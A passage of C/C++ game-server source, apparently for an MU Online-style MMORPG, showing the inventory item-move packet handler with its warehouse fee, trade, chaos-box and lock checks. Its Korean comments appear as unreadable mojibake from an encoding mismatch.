			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			return;
		}
	}
#endif // ADD_ITEM_SOCKET_OPTION_MIX_20080415
	
	if( lpMsg->sFlag == ITEMMOVE_WAREHOUSE || lpMsg->tFlag == ITEMMOVE_WAREHOUSE )		// â�� ������� �ƴҶ� ������ �̵��� �ȵǰ�..
	{
		if( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != I_WAREHOUSE ) 
		{
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			LogAdd("[%s][%s] error-L1 : used not Warehouse", gObj[aIndex].AccountID, gObj[aIndex].Name);
			return;
		}
	}
	// 2002/09/09 �߰� 
	// �ŷ�â���� �κ��丮�� �ű�ÿ� �ŷ����ΰ� üũ �ǵ���..
	if( lpMsg->sFlag == ITEMMOVE_TRADEWND && lpMsg->tFlag == ITEMMOVE_INVENTORY )
	{
		if( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != I_TRADE ) 
		{
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			LogAdd("[%s][%s] error-L1 : used not Trade", gObj[aIndex].AccountID, gObj[aIndex].Name);
			return;
		}
	}

	// �������� �̵��� �� ���ٸ�
	if( (lpMsg->sFlag == ITEMMOVE_WAREHOUSE && lpMsg->tFlag == ITEMMOVE_INVENTORY) )	
	{	
		// â���� �κ����� �̵��Ҷ��� ���ᰡ �־�� �ȴ�

#ifdef MASTER_LEVEL_UP_SYSTEM_20070912	// ���շ��� - â�� ���� ����
		int  rZen = GetWarehouseUsedHowMuch( lpObj->Level, lpObj->m_nMasterLevel, lpObj->WarehousePW );
#else
		int  rZen = GetWarehouseUsedHowMuch(lpObj->Level, lpObj->WarehousePW);
#endif

		
#ifdef MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
		if( (lpObj->Money-rZen) < 0 && (lpObj->WarehouseMoney-rZen) < 0)
#else // MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
		if( (lpObj->Money-rZen) < 1 && (lpObj->WarehouseMoney-rZen) < 1)
#endif // MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
		{	// �κ��̳� â�� ����	������
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);

			char msg[255];
			wsprintf(msg, lMsg.Get(1605), rZen);
			//wsprintf(msg, "â���� ������ �����Ƿ��� %d���� �ʿ��մϴ�", rZen);
			GCServerMsgStringSend(msg, lpObj->m_Index, 1);	
			return;
		}

		if( bCanWarehouseLock == TRUE )
		{
			if( gObj[aIndex].WarehouseLock == 1 )
			{
				GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);				
				GCServerMsgStringSend(lMsg.Get(1606), lpObj->m_Index, 1);	
				//GCServerMsgStringSend("â�� ��� �ֽ��ϴ�.", lpObj->m_Index, 1);	
				return;
			}
		}
	}

#ifdef NEW_SKILL_FORSKYLAND	
	if(it_type != I_INVENTORY )
	{
#ifdef ITEM_INDEX_EXTEND_20050706
		int type	= ItemInfo[0]+((ItemInfo[3]&0x80)<<1)+((ItemInfo[5]&0xF0)<<5);
#else
		int type	= ItemInfo[0]+(((ItemInfo[3]&0x80)>>7)*256);
#endif

		ITEM_ATTRIBUTE * p = GetItemAttr(type);
		if( !p )
		{
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			return;
		}

		if( p->QuestItem )
		{	// ����Ʈ �������� �̵����� ���Ѵ�
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			return;
		}
	}
#endif

	if( (lpMsg->sFlag == ITEMMOVE_INVENTORY && lpMsg->tFlag == ITEMMOVE_INVENTORY) ||	// �κ� -> �κ�
		(lpMsg->sFlag == ITEMMOVE_WAREHOUSE && lpMsg->tFlag == ITEMMOVE_INVENTORY) ||	// â�� -> �κ�
		(lpMsg->sFlag == ITEMMOVE_INVENTORY && lpMsg->tFlag == ITEMMOVE_WAREHOUSE) ||	// �κ� -> â��	
		(lpMsg->sFlag == ITEMMOVE_WAREHOUSE && lpMsg->tFlag == ITEMMOVE_WAREHOUSE) ||	// â�� -> â��
		(lpMsg->sFlag == ITEMMOVE_INVENTORY && lpMsg->tFlag == ITEMMOVE_CHAOSBOX) ||	// �κ� -> ī����
#ifdef DARKLORD_WORK		// ���û��ʵ� ������ ī���� ���հ� ���� ó�� �Ѵ�
		(lpMsg->sFlag == ITEMMOVE_INVENTORY && lpMsg->tFlag == ITEMMOVE_DARK_TRAINER) ||	// �κ� -> ī����2
#endif

#ifdef ADD_JEWEL_OF_HARMONY_SYSTEM_20060530
		(lpMsg->sFlag == ITEMMOVE_INVENTORY && lpMsg->tFlag == ITEMMOVE_JEWELOFHARMONY_PURITY) ||	// �κ� -> ��ȭ�Ǻ��� ��ȭâ
		(lpMsg->sFlag == ITEMMOVE_INVENTORY && lpMsg->tFlag == ITEMMOVE_JEWELOFHARMONY_SMELT)  ||	// �κ� -> ���ü� ����â 
		(lpMsg->sFlag == ITEMMOVE_INVENTORY && lpMsg->tFlag == ITEMMOVE_JEWELOFHARMONY_RESTORE) ||	// �κ� -> ��ȭ������ ȯ�� â
#endif  // ADD_JEWEL_OF_HARMONY_SYSTEM_20060530

#ifdef ADD_PCS_LOTTERY_SYSTEM_20070117
		(lpMsg->sFlag == ITEMMOVE_INVENTORY && lpMsg->tFlag == ITEMMOVE_LOTTERY_MIX ) ||	// �κ� -> ���� ����â
		(lpMsg->sFlag == ITEMMOVE_LOTTERY_MIX && lpMsg->tFlag == ITEMMOVE_LOTTERY_MIX ) ||	// ���� ����â -> ���� ����â
		(lpMsg->sFlag == ITEMMOVE_LOTTERY_MIX && lpMsg->tFlag == ITEMMOVE_INVENTORY ) ||	// ���� ����â -> �κ�
#endif // ADD_PCS_LOTTERY_SYSTEM_20070117

#ifdef ADD_ITEM_SOCKET_OPTION_MIX_20080415
		(lpMsg->sFlag == ITEMMOVE_INVENTORY && lpMsg->tFlag == ITEMMOVE_SOCKET_ITEM_EXTRACT ) ||	// �κ� -> ���� ������ ����
		(lpMsg->sFlag == ITEMMOVE_INVENTORY && lpMsg->tFlag == ITEMMOVE_SOCKET_ITEM_COMPOSIT ) ||	// �κ� -> ���� ������ �ռ�
		(lpMsg->sFlag == ITEMMOVE_INVENTORY && lpMsg->tFlag == ITEMMOVE_SOCKET_ITEM_EQUIP )	||		// �κ� -> ���� ������ ����
		(lpMsg->sFlag == ITEMMOVE_INVENTORY && lpMsg->tFlag == ITEMMOVE_SOCKET_ITEM_REMOVE ) ||		// �κ� -> ���� ������ ����
		(lpMsg->sFlag == ITEMMOVE_SOCKET_ITEM_EXTRACT && lpMsg->tFlag == ITEMMOVE_INVENTORY ) ||	// ���� ������ ���� -> �κ�
		(lpMsg->sFlag == ITEMMOVE_SOCKET_ITEM_COMPOSIT && lpMsg->tFlag == ITEMMOVE_INVENTORY ) ||	// ���� ������ �ռ� -> �κ�
		(lpMsg->sFlag == ITEMMOVE_SOCKET_ITEM_EQUIP && lpMsg->tFlag == ITEMMOVE_INVENTORY ) ||		// ���� ������ ���� -> �κ�
		(lpMsg->sFlag == ITEMMOVE_SOCKET_ITEM_REMOVE && lpMsg->tFlag == ITEMMOVE_INVENTORY ) ||		// ���� ������ ���� -> �κ�
#endif // ADD_ITEM_SOCKET_OPTION_MIX_20080415

#ifdef ADD_EVENT_CHERRYBLOSSOM_20080312
		(lpMsg->sFlag == ITEMMOVE_INVENTORY && lpMsg->tFlag == ITEMMOVE_CHERRYBLOSSOM ) ||	// �κ� -> ���� ����â
		(lpMsg->sFlag == ITEMMOVE_CHERRYBLOSSOM && lpMsg->tFlag == ITEMMOVE_CHERRYBLOSSOM ) ||	// ���� ����â -> ���� ����â
		(lpMsg->sFlag == ITEMMOVE_CHERRYBLOSSOM && lpMsg->tFlag == ITEMMOVE_INVENTORY ) ||	// ���� ����â -> �κ�
#endif // ADD_EVENT_CHERRYBLOSSOM_20080312

#ifdef PERSONAL_SHOP_20040113 
		(lpMsg->sFlag == ITEMMOVE_INVENTORY && lpMsg->tFlag == ITEMMOVE_PSHOPWND) ||	// �κ� -> ���λ���
		(lpMsg->sFlag == ITEMMOVE_PSHOPWND && lpMsg->tFlag == ITEMMOVE_INVENTORY) ||	// ���λ��� -> �κ�
		(lpMsg->sFlag == ITEMMOVE_PSHOPWND && lpMsg->tFlag == ITEMMOVE_PSHOPWND) ||		// ���λ��� -> ���λ���
#endif

#ifdef DARKLORD_WORK		// ���û��ʵ� ������ ī���� ���հ� ���� ó�� �Ѵ�		
		(lpMsg->sFlag == ITEMMOVE_DARK_TRAINER && lpMsg->tFlag == ITEMMOVE_INVENTORY) ||	// ī���� -> �κ�
		(lpMsg->sFlag == ITEMMOVE_DARK_TRAINER && lpMsg->tFlag == ITEMMOVE_DARK_TRAINER)  ||		// ī���� -> ī����
#endif

#ifdef ADD_JEWEL_OF_HARMONY_SYSTEM_20060530		
		(lpMsg->sFlag == ITEMMOVE_JEWELOFHARMONY_PURITY && lpMsg->tFlag == ITEMMOVE_INVENTORY) ||				// ����â -> �κ�
		(lpMsg->sFlag == ITEMMOVE_JEWELOFHARMONY_PURITY && lpMsg->tFlag == ITEMMOVE_JEWELOFHARMONY_PURITY)  ||	// ����â -> ����â

		(lpMsg->sFlag == ITEMMOVE_JEWELOFHARMONY_SMELT && lpMsg->tFlag == ITEMMOVE_INVENTORY) ||				// ����â -> �κ�
		(lpMsg->sFlag == ITEMMOVE_JEWELOFHARMONY_SMELT && lpMsg->tFlag == ITEMMOVE_JEWELOFHARMONY_SMELT)  ||	// ����â -> ����â

		(lpMsg->sFlag == ITEMMOVE_JEWELOFHARMONY_RESTORE && lpMsg->tFlag == ITEMMOVE_INVENTORY) ||				 // ȯ��â -> �κ�
		(lpMsg->sFlag == ITEMMOVE_JEWELOFHARMONY_RESTORE && lpMsg->tFlag == ITEMMOVE_JEWELOFHARMONY_RESTORE)  || // ȯ��â -> ȯ��â
#endif // ADD_JEWEL_OF_HARMONY_SYSTEM_20060530

#ifdef MODIFY_ITEM_SOCKET_OPTION_BUGFIX_03_20080704
		(lpMsg->sFlag == ITEMMOVE_SOCKET_ITEM_EXTRACT && lpMsg->tFlag == ITEMMOVE_INVENTORY ) ||				// ���� ������ ���� -> �κ�
		(lpMsg->sFlag == ITEMMOVE_SOCKET_ITEM_COMPOSIT && lpMsg->tFlag == ITEMMOVE_INVENTORY ) ||				// ���� ������ �ռ� -> �κ�
		(lpMsg->sFlag == ITEMMOVE_SOCKET_ITEM_EQUIP && lpMsg->tFlag == ITEMMOVE_INVENTORY ) ||				// ���� ������ ���� -> �κ�
		(lpMsg->sFlag == ITEMMOVE_SOCKET_ITEM_REMOVE && lpMsg->tFlag == ITEMMOVE_INVENTORY ) ||				// ���� ������ �ռ� -> �κ�

		(lpMsg->sFlag == ITEMMOVE_SOCKET_ITEM_EXTRACT && lpMsg->tFlag == ITEMMOVE_SOCKET_ITEM_EXTRACT ) ||				// ���� ������ ���� -> �κ�
		(lpMsg->sFlag == ITEMMOVE_SOCKET_ITEM_COMPOSIT && lpMsg->tFlag == ITEMMOVE_SOCKET_ITEM_COMPOSIT ) ||				// ���� ������ �ռ� -> �κ�
		(lpMsg->sFlag == ITEMMOVE_SOCKET_ITEM_EQUIP && lpMsg->tFlag == ITEMMOVE_SOCKET_ITEM_EQUIP ) ||				// ���� ������ ���� -> �κ�
		(lpMsg->sFlag == ITEMMOVE_SOCKET_ITEM_REMOVE && lpMsg->tFlag == ITEMMOVE_SOCKET_ITEM_REMOVE ) ||				// ���� ������ �ռ� -> �κ�
#endif // MODIFY_ITEM_SOCKET_OPTION_BUGFIX_03_20080704

		(lpMsg->sFlag == ITEMMOVE_CHAOSBOX && lpMsg->tFlag == ITEMMOVE_INVENTORY) ||	// ī���� -> �κ�
		(lpMsg->sFlag == ITEMMOVE_CHAOSBOX && lpMsg->tFlag == ITEMMOVE_CHAOSBOX) )		// ī���� -> ī����
	{
		int durSsend, durTsend;

		result = gObjInventoryMoveItem(aIndex, source, target, durSsend, durTsend, lpMsg->sFlag, lpMsg->tFlag, ItemInfo);

		GCItemMoveResultSend(aIndex, result, target, ItemInfo);
		
		if( durSsend )
			GCItemDurSend(aIndex, source, (int)lpObj->pInventory[source].m_Durability, 0);

		if( durTsend )
			GCItemDurSend(aIndex, target, (int)lpObj->pInventory[target].m_Durability, 0);

#ifdef MODIFY_MOVE_KUNDUN_MARK_20070307	// ����� ǥ�� �̵��� ������ �̹��� ������� ���� ����
		int itemtype	= lpMsg->sItemInfo[0]+((lpMsg->sItemInfo[3]&0x80)<<1)+((lpMsg->sItemInfo[5]&0xF0)<<5);		
		if(itemtype == MAKE_ITEMNUM(14,29) && lpObj->pInventory[target].m_Durability == 0 
			&& lpMsg->sFlag == ITEMMOVE_INVENTORY && lpMsg->tFlag == ITEMMOVE_INVENTORY)
		{
			GCInventoryItemDeleteSend(aIndex, target, 0);
		}
#else	// MODIFY_MOVE_KUNDUN_MARK_20070307
#ifdef MODIFY_CREATE_LOSTMAP_ITEM_20070209
		int itemtype	= lpMsg->sItemInfo[0]+((lpMsg->sItemInfo[3]&0x80)<<1)+((lpMsg->sItemInfo[5]&0xF0)<<5);		
		if(itemtype == MAKE_ITEMNUM(14,29) && lpObj->pInventory[target].m_Durability == 0)
		{
			GCInventoryItemDeleteSend(aIndex, target, 0);
		}
#endif
#endif	// MODIFY_MOVE_KUNDUN_MARK_20070307
		
		if( (result!=0xFF)&& (lpMsg->sFlag == ITEMMOVE_WAREHOUSE && lpMsg->tFlag == ITEMMOVE_INVENTORY) )	
		{	
			// â���� �κ����� �̵��Ҷ��� ��������

#ifdef MASTER_LEVEL_UP_SYSTEM_20070912	// ���շ��� - â�� ���� ����
			int  rZen = GetWarehouseUsedHowMuch( lpObj->Level, lpObj->m_nMasterLevel, lpObj->WarehousePW );
#else	
			int  rZen = GetWarehouseUsedHowMuch(lpObj->Level, lpObj->WarehousePW);
#endif

#ifdef MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
			if( lpObj->Money-rZen >= 0 )
#else // MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
			if( lpObj->Money-rZen > 0 )
#endif // MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
			{
				int oldmoney=lpObj->Money;
				lpObj->Money -= rZen;
				GCMoneySend(lpObj->m_Index, lpObj->Money);
				LogAdd("Pay WareHouse Money(In Inventory) : %d - %d = %d", oldmoney, rZen, lpObj->Money);
			}
#ifdef MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
			else if( lpObj->WarehouseMoney-rZen >= 0 )
#else // MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
			else if( lpObj->WarehouseMoney-rZen > 0 )
#endif // MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
			{
				int oldmoney=lpObj->WarehouseMoney;
				lpObj->WarehouseMoney -= rZen;
				LogAdd("Pay WareHouse Money(In WareHouse) : %d - %d = %d", oldmoney, rZen, lpObj->WarehouseMoney);
				GCWarehouseInventoryMoneySend(aIndex, 0x01, lpObj->Money, lpObj->WarehouseMoney);
			}
		}
	}
	// Ʈ���̵� �������� �̵��̸�
	else if( lpMsg->sFlag == ITEMMOVE_TRADEWND && lpMsg->tFlag == ITEMMOVE_TRADEWND )
	{
		result = gObjTradeTradeMove(lpObj, source, target);
		GCItemMoveResultSend(aIndex, result, target, ItemInfo);

		
	}
	// Ʈ���̵忡�� �κ��丮���� �̵��̸�
	else if( lpMsg->sFlag == ITEMMOVE_TRADEWND && lpMsg->tFlag == ITEMMOVE_INVENTORY )
	{
		result = gObjTradeInventoryMove(lpObj, source, target);
		
		if( result == 0xFF )
		{
			GCItemMoveResultSend(aIndex, 0xFF, target, ItemInfo);
			
			CGTradeCancelButtonRecv(aIndex);
		}
		else 
		{
			GCItemMoveResultSend(aIndex, result, target, ItemInfo);

		}
		if( result == 0xFF )
		{
			lpObj->m_IfState.state = 0;
			GCItemListSend(aIndex);
		}
		if( lpObj->TargetNumber >= 0 )
		{
			lpObj->TradeOk = 0;
			gObj[gObj[aIndex].TargetNumber].TradeOk = 0;
			GCTradeOkButtonSend(lpObj->TargetNumber, 0x02);
			GCTradeOkButtonSend(aIndex, 0x00);
		}
	}
	// �κ��丮���� Ʈ���̵���� �̵��̸�
	else if( lpMsg->sFlag == ITEMMOVE_INVENTORY && lpMsg->tFlag == ITEMMOVE_TRADEWND )
	{
		result = gObjInventoryTradeMove(lpObj, source, target);
		GCItemMoveResultSend(aIndex, result, target, ItemInfo);

	}
}


#else


//----------------------------------------------------------------------------
// [0x24] ������ ������ ���� �䱸(�κ��丮���� ������ �̵������� ���)
void CGInventoryItemMove(LPPMSG_INVENTORYITEMMOVE lpMsg, int aIndex)
{
	BYTE result;

	BYTE ItemInfo[ITEM_BUFFER_SIZE];
	
	if( PacketCheckTime(&gObj[aIndex]) == FALSE ) 
	{	//GCResultSend(aIndex, 0x24, 0xFF);
		GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
		return;
	}
	if( gObjIsConnectedGP(aIndex) == FALSE ) 
	{
		LogAddC(LOGC_RED, "[%s][%d] error-L3", __FILE__,__LINE__);
		GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
		return;
	}
	
	LPOBJECTSTRUCT	lpObj = &gObj[aIndex];
	int it_type = 0;


#ifdef WAREHOUSE_ITEMCOPY_BUG_FIX
	if( lpObj->m_ReqWarehouseOpen )
	{	// â�� ���� �ִ� �߿��� ������ �̵��� �ȵ�
		LogAddC(LOGC_RED, "[%s][%d] error-L3", __FILE__,__LINE__);
		GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
		return;
	}
#endif

	int source = lpMsg->source_item_num;
	int target = lpMsg->target_item_num;

	if( lpMsg->tFlag == 2 || lpMsg->sFlag == 2 )	// â���� �̵�
		it_type = I_WAREHOUSE;
	if( lpMsg->tFlag == 0 && lpMsg->sFlag == 0 )	// �κ��丮���� �̵�
		it_type = I_INVENTORY;
	
	if( gObjCanItemTouch(lpObj, it_type) == FALSE )	// �������� �̵��� �� ���ٸ�
	{
		// ������ ���ÿ� ȭ���� �̵��ǰ� �Ѵ�
		if( lpMsg->sItemInfo[0] == MAKE_ITEMNUM(4, 7) || lpMsg->sItemInfo[0] == MAKE_ITEMNUM(4, 15) )
		{
			if( (target >= MAX_EQUIPMENT || source < MAX_EQUIPMENT) )
			{			
				GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
				return;
			}
		}	
		else
		{
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			return;
		}
	}

	if( lpObj->DieRegen ) 
	{
		// �׾� �ִ� �߿��� ����� �Ұ��� �ϴ�.
		GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
		return;
	}
	
	ItemInfo[0] = lpMsg->sItemInfo[0];
	ItemInfo[1] = lpMsg->sItemInfo[1];
	ItemInfo[2] = lpMsg->sItemInfo[2];
	ItemInfo[3] = lpMsg->sItemInfo[3];

#if ITEM_BUFFER_SIZE > 4
	ItemInfo[4] = lpMsg->sItemInfo[4];
#endif

#ifdef ITEM_INDEX_EXTEND_20050706
	ItemInfo[5] = lpMsg->sItemInfo[5];
	ItemInfo[6] = lpMsg->sItemInfo[6];
#endif

	if( lpMsg->sFlag == ITEMMOVE_CHAOSBOX || lpMsg->tFlag == ITEMMOVE_CHAOSBOX )		// ī�����ڽ� ������� �ƴҶ� ������ �̵��� �ȵǰ�..
	{
		if( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != I_CHAOSBOX ) 
		{
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			LogAdd("[%s][%s] error-L1 : used not Chaosbox", gObj[aIndex].AccountID, gObj[aIndex].Name);
			return;
		}
		if( lpObj->ChaosLock == TRUE )	// �ͽ� ���̸� �̵��� �ȵǰ�..
		{
			LogAddTD("[%s][%s] error-L3 : CBMixing", gObj[aIndex].AccountID, gObj[aIndex].Name);
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			return;
		}
	}

#ifdef DARKLORD_WORK
	if( lpMsg->sFlag == ITEMMOVE_DARK_TRAINER || lpMsg->tFlag == ITEMMOVE_DARK_TRAINER )		// ���û����� �ڽ� ������� �ƴҶ� ������ �̵��� �ȵǰ�
	{
		if( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != I_DARK_TRAINER ) 
		{
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			LogAdd("[%s][%s] error-L1 : used not DarkTrainerBox", gObj[aIndex].AccountID, gObj[aIndex].Name);
			return;
		}
		if( lpObj->ChaosLock == TRUE )	// �ͽ� ���̸� �̵��� �ȵǰ�..
		{
			LogAddTD("[%s][%s] error-L3 : DarkTrainerBoxMix", gObj[aIndex].AccountID, gObj[aIndex].Name);
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			return;
		}
	}
#endif

#ifdef ADD_JEWEL_OF_HARMONY_SYSTEM_20060530	
	// ��ȭ�Ǻ��� ��ȭ / ���ü� ���� / ��ȭ������ ȯ��
	if( lpMsg->sFlag == ITEMMOVE_JEWELOFHARMONY_PURITY	|| 
		lpMsg->sFlag == ITEMMOVE_JEWELOFHARMONY_SMELT	|| 
		lpMsg->sFlag == ITEMMOVE_JEWELOFHARMONY_RESTORE || 
		lpMsg->tFlag == ITEMMOVE_JEWELOFHARMONY_PURITY ||
		lpMsg->tFlag == ITEMMOVE_JEWELOFHARMONY_SMELT ||
		lpMsg->tFlag == ITEMMOVE_JEWELOFHARMONY_RESTORE 
		)
	{
		if( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != I_CHAOSBOX ) 
		{
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			LogAdd("[%s][%s] error-L1 : used not ChaosBox", gObj[aIndex].AccountID, gObj[aIndex].Name);
			return;
		}
		if( lpObj->ChaosLock == TRUE )	// �ͽ� ���̸� �̵��� �ȵǰ�..
		{
			LogAddTD("[%s][%s] error-L3 : JewelOfHarmony Mixing", gObj[aIndex].AccountID, gObj[aIndex].Name);
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			return;
		}
	}
#endif	// ADD_JEWEL_OF_HARMONY_SYSTEM_20060530

#ifdef ADD_ITEM_SOCKET_OPTION_MIX_20080415
	// ���� ������ ����
	if( lpMsg->sFlag == ITEMMOVE_SOCKET_ITEM_EXTRACT ||
		lpMsg->sFlag == ITEMMOVE_SOCKET_ITEM_COMPOSIT ||
		lpMsg->sFlag == ITEMMOVE_SOCKET_ITEM_EQUIP ||
		lpMsg->sFlag == ITEMMOVE_SOCKET_ITEM_REMOVE ||
		lpMsg->tFlag == ITEMMOVE_SOCKET_ITEM_EXTRACT ||
		lpMsg->tFlag == ITEMMOVE_SOCKET_ITEM_COMPOSIT ||
		lpMsg->tFlag == ITEMMOVE_SOCKET_ITEM_EQUIP ||
		lpMsg->tFlag == ITEMMOVE_SOCKET_ITEM_REMOVE
	  )
	{
		if( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != I_CHAOSBOX ) 
		{
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			LogAdd("[%s][%s] error-L1 : used not ChaosBox", gObj[aIndex].AccountID, gObj[aIndex].Name);
			return;
		}
		if( lpObj->ChaosLock == TRUE )	// �ͽ� ���̸� �̵��� �ȵǰ�..
		{
			LogAddTD("[%s][%s] error-L3 : SocketItem Mixing", gObj[aIndex].AccountID, gObj[aIndex].Name);
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			return;
		}
	}

#endif // ADD_ITEM_SOCKET_OPTION_MIX_20080415

#ifdef ADD_PCS_LOTTERY_SYSTEM_20070117
	if( lpMsg->sFlag == ITEMMOVE_LOTTERY_MIX || lpMsg->tFlag == ITEMMOVE_LOTTERY_MIX )
	{
		if( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != I_CHAOSBOX ) 
		{
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			LogAdd("[%s][%s] error-L1 : used not ChaosBox", gObj[aIndex].AccountID, gObj[aIndex].Name);
			return;
		}
		if( lpObj->ChaosLock == TRUE )	// �ͽ� ���̸� �̵��� �ȵǰ�..
		{
			LogAddTD("[%s][%s] error-L3 : JewelOfHarmony Mixing", gObj[aIndex].AccountID, gObj[aIndex].Name);
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			return;
		}
	}
#endif // ADD_PCS_LOTTERY_SYSTEM_20070117

	if( lpMsg->sFlag == ITEMMOVE_WAREHOUSE || lpMsg->tFlag == ITEMMOVE_WAREHOUSE )		// â�� ������� �ƴҶ� ������ �̵��� �ȵǰ�..
	{
		if( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != I_WAREHOUSE ) 
		{
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			LogAdd("[%s][%s] error-L1 : used not Warehouse", gObj[aIndex].AccountID, gObj[aIndex].Name);
			return;
		}
	}
	// 2002/09/09 �߰� 
	// �ŷ�â���� �κ��丮�� �ű�ÿ� �ŷ����ΰ� üũ �ǵ���..
	if( lpMsg->sFlag == 1 && lpMsg->tFlag == 0 )
	{
		if( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != I_TRADE ) 
		{
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			LogAdd("[%s][%s] error-L1 : used not Trade", gObj[aIndex].AccountID, gObj[aIndex].Name);
			return;
		}
	}

	// �������� �̵��� �� ���ٸ�
	if( (lpMsg->sFlag == 2 && lpMsg->tFlag == 0) )	
	{	
		// â���� �κ����� �̵��Ҷ��� ���ᰡ �־�� �ȴ�
#ifdef MASTER_LEVEL_UP_SYSTEM_20070912	// ���շ��� - â�� ���� ����
		int  rZen = GetWarehouseUsedHowMuch( lpObj->Level, lpObj->m_nMasterLevel, lpObj->WarehousePW );
#else
		int  rZen = GetWarehouseUsedHowMuch(lpObj->Level, lpObj->WarehousePW);
#endif

		
#ifdef MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
		if( (lpObj->Money-rZen) < 0 && (lpObj->WarehouseMoney-rZen) < 0)
#else // MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
		if( (lpObj->Money-rZen) < 1 && (lpObj->WarehouseMoney-rZen) < 1)
#endif // MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
		{	// �κ��̳� â�� ����	������
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);

			char msg[255];
			wsprintf(msg, lMsg.Get(1605), rZen);
			//wsprintf(msg, "â���� ������ �����Ƿ��� %d���� �ʿ��մϴ�", rZen);
			GCServerMsgStringSend(msg, lpObj->m_Index, 1);	
			return;
		}

		if( bCanWarehouseLock == TRUE )
		{
			if( gObj[aIndex].WarehouseLock == 1 )
			{
				GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);				
				GCServerMsgStringSend(lMsg.Get(1606), lpObj->m_Index, 1);	
				//GCServerMsgStringSend("â�� ��� �ֽ��ϴ�.", lpObj->m_Index, 1);	
				return;
			}
		}
	}

#ifdef NEW_SKILL_FORSKYLAND	
	if(it_type != I_INVENTORY )
	{
#ifdef ITEM_INDEX_EXTEND_20050706
		int type	= ItemInfo[0]+((ItemInfo[3]&0x80)<<1)+((ItemInfo[5]&0xF0)<<5);
#else
		int type	= ItemInfo[0]+(((ItemInfo[3]&0x80)>>7)*256);
#endif

		ITEM_ATTRIBUTE * p = GetItemAttr(type);
		if( !p )
		{
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			return;
		}

		if( p->QuestItem )
		{	// ����Ʈ �������� �̵����� ���Ѵ�
			GCItemMoveResultSend(aIndex, 0xFF, 0, ItemInfo);
			return;
		}
	}
#endif

	if( (lpMsg->sFlag == 0 && lpMsg->tFlag == 0) ||	// �κ� -> �κ�
		(lpMsg->sFlag == 2 && lpMsg->tFlag == 0) ||	// â�� -> �κ�
		(lpMsg->sFlag == 0 && lpMsg->tFlag == 2) ||	// �κ� -> â��	
		(lpMsg->sFlag == 2 && lpMsg->tFlag == 2) ||	// â�� -> â��
		(lpMsg->sFlag == 0 && lpMsg->tFlag == 3) ||	// �κ� -> ī����
		(lpMsg->sFlag == 3 && lpMsg->tFlag == 0) ||	// ī���� -> �κ�
		(lpMsg->sFlag == 3 && lpMsg->tFlag == 3) )	// ī���� -> ī����
	{
		int durSsend, durTsend;

		result = gObjInventoryMoveItem(aIndex, source, target, durSsend, durTsend, lpMsg->sFlag, lpMsg->tFlag, ItemInfo);

		GCItemMoveResultSend(aIndex, result, target, ItemInfo);
		
		if( durSsend )
			GCItemDurSend(aIndex, source, (int)lpObj->pInventory[source].m_Durability, 0);

		if( durTsend )
			GCItemDurSend(aIndex, target, (int)lpObj->pInventory[target].m_Durability, 0);

		
		if( (result!=0xFF)&& (lpMsg->sFlag == 2 && lpMsg->tFlag == 0) )	
		{	// â���� �κ����� �̵��Ҷ��� ��������

#ifdef MASTER_LEVEL_UP_SYSTEM_20070912	// ���շ��� - â�� ���� ����
			int  rZen = GetWarehouseUsedHowMuch( lpObj->Level, lpObj->m_nMasterLevel, lpObj->WarehousePW );
#else
			int  rZen = GetWarehouseUsedHowMuch(lpObj->Level, lpObj->WarehousePW);
#endif

#ifdef MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
			if( lpObj->Money-rZen >= 0 )
#else // MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
			if( lpObj->Money-rZen > 0 )
#endif // MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
			{
				int oldmoney=lpObj->Money;
				lpObj->Money -= rZen;
